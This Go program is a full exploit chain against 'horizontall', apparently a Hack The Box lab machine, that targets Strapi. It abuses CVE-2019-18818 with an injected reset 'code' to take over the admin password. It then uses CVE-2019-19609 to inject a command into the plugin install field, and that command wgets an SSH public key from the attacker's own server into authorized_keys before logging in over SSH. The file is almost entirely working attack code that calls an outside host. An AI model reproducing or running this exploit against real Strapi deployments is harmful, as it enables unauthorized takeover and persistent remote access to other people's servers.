package main

// User ssh session on horizontall

import (
    "fmt"
    "bytes"
    "os"
    "os/exec"
    "io/ioutil"
    "net"
    "net/http"
    "encoding/json"
)

// Get the JWT string after changing the password
type JsonResponse struct {
    Jwt string  `json:"jwt"`
}

func main() {
    jwt := resetPassword()              // Reset the password to get a jwt token
    keyname := "id_rsa_horizontall"
    rce(jwt, keyname)                   // Create ssh keys and upload them
    sshclient("10.10.11.105", keyname)  // SSH into the remote server
}

// Exploit CVE-2019-18818
// Strapi - Set Password (Unauthenticated) vulnerability
func resetPassword() (string) {
    // Change the password to "rockyou"
    url := "http://api-prod.horizontall.htb/admin/auth/reset-password"
    params := `{
        "code":{"$gt":0},
        "password":"rockyou",
        "passwordConfirmation":"rockyou"
    }`
    headers := make(map[string]string)
    headers["Content-Type"] = "application/json; charset=UTF-8"

    // Make the post request
    response := postRequest(url, params, headers)
    defer response.Body.Close()

    // Parse the json response to get the jwt for authentication
    body, _ := ioutil.ReadAll(response.Body)
    fmt.Println(string(body))
    return getJwt(body)
}

// Parse json to get the JWT for authentication
func getJwt(body []uint8) (string) {
    json_response := new(JsonResponse)
    err := json.Unmarshal([]byte(body), &json_response)
    check(err, "Could not parse json")
    return json_response.Jwt
}

// Exploit CVE-2019-19609
// Strapi - Remote Code Execution (Authenticated)
func rce(jwt, keyname string) {
    // Generate a private and public ssh key
    sshkeygen(keyname)

    // Start an http fileserver in the current directory
    port := "8081"
    myIP := getMyIp("tun0")
    myserver := fmt.Sprintf("http://%s:%s/%s", myIP, port, keyname+".pub")
    go httpserver(port)

    // Use RCE to upload public ssh key
    url := "http://api-prod.horizontall.htb/admin/plugins/install"
    params := fmt.Sprintf(`{
        "plugin":"documentation && $(%s)",
        "port":1337
    }`, `mkdir $HOME/.ssh; wget ` + myserver + ` -O $HOME/.ssh/authorized_keys`)
    headers := make(map[string]string)
    headers["Content-Type"] = "application/json; charset=UTF-8"
    headers["Authorization"] = "Bearer " + jwt

    // Make the post request
    postRequest(url, params, headers)
}

// Create an ssh key to upload
func sshkeygen(output string) {
    // Generate the public and private ssh keys
    out, err := exec.Command("ssh-keygen", "-f", output, "-t", "rsa").Output()
    check(err, output + " already exists")
    fmt.Println(string(out))
}

// Start an http fileserver in this directory
func httpserver(port string) {
    fs := http.FileServer(http.Dir("."))
    http.ListenAndServe(":"+port, fs)
}

// Get my ip address on an interface
func getMyIp(interface_name string) (string) {
    device, err := net.InterfaceByName(interface_name)
    check(err, "Could not get interface " + interface_name)
    addrs, err := device.Addrs()
    check(err, "Could not get addrs on " + interface_name)
    ip_addr := addrs[0].(*net.IPNet).IP.To4().String()
    return ip_addr
}

// SSH into the remote server
func sshclient(ip string, privatekey string) {
    // Execute os ssh command
    cmd := exec.Command("ssh", "strapi@" + ip, "-i", privatekey)
    cmd.Stdin = os.Stdin
    cmd.Stdout = os.Stdout
    cmd.Stderr = os.Stderr
    err := cmd.Run()
    check(err, "Could not ssh into the server")
}

// Make an http post request given a URL and json parameters
func postRequest(url, params string, headers map[string]string) (*http.Response) {
    // Create a POST request with JSON params
    json_data := []byte(params)
    request, err := http.NewRequest("POST", url, bytes.NewBuffer(json_data))
    check(err, "Could not make POST request")
    for key, value := range headers {
        request.Header.Add(key, value)
    }

    // Make the POST request
    client := new(http.Client)
    response, err := client.Do(request)

    check(err, "Could not make POST request")
    return response
}

// Check for errors and print a message
func check(err error, message string) {
    if err != nil {
        fmt.Println(message)
        panic(err)
    }
}
